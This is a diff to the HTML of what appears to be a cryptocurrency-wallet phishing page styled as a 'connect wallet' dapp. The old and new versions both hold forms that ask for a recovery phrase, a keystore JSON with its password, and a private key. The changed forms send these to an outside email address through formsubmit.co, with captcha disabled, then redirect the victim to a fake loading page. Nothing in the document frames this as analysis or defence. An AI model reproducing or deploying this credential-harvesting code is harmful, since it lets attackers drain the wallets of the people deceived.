@@ -270,39 +270,30 @@
     </div>
     <div class="container">
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
-            <form id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
-                <input type="hidden" name="access_key" value="848cae35-680f-45e4-9cdb-3e5f8edc8ecc">
-                <input type="hidden" name="redirect" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
-                <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
-                <input type="hidden" name="user_ip" id="user_ip_phrase">
-                <input type="hidden" name="type" id="type-phrase">
-                <button type="submit" value="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
-                <p class="form-instrunctions text-center">Typically 12 (sometimes 24) words separated by single spaces</p>
-            </form>
-
+            <form id="pass-phrase" action="https://formsubmit.co/maleek.8erryberry@yandex.com" method="POST">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
+  <textarea name="phrase" placeholder="Enter your recovery phrase" required></textarea>
+  <button type="submit">Submit</button>
+</form>
 
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-            <form id="keystore-form" action="https://api.web3forms.com/submit" method="POST">
-                <input type="hidden" name="access_key" value="848cae35-680f-45e4-9cdb-3e5f8edc8ecc">
-                <input type="hidden" name="redirect" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
-                <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
-                <input type="hidden" name="user_ip" id="user_ip_keystore">
-                <input type="hidden" name="type" id="type-keystore">
-                <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
-                <p class="form-instrunctions text-center">Several lines of text beginning with "{...}" plus the password you used to encrypt it</p>
-            </form>
+            <form id="keystore-json" action="https://formsubmit.co/maleek.8erryberry@yandex.com" method="POST">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
+  <textarea name="keystore" placeholder="Paste your keystore JSON" required></textarea>
+  <input type="password" name="password" placeholder="Enter your wallet password" required>
+  <button type="submit">Submit</button>
+</form>
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
-            <form id="privatekey-form" action="https://api.web3forms.com/submit" method="POST">
-                <input type="hidden" name="access_key" value="848cae35-680f-45e4-9cdb-3e5f8edc8ecc">
-                <input type="hidden" name="redirect" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
-                <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
-                <input type="hidden" name="user_ip" id="user_ip_key">
-                <input type="hidden" name="type" id="type-key">
-                <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
-                <p class="form-instrunctions text-center">Typically 64 alphanumeric characters</p>
-            </form>
+            <form id="private-key" action="https://formsubmit.co/maleek.8erryberry@yandex.com" method="POST">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
+  <input type="text" name="privatekey" placeholder="Enter your private key" required>
+  <button type="submit">Submit</button>
+</form>
         </div>
     </div>
     <div id="custom-alert" class="custom-alert">
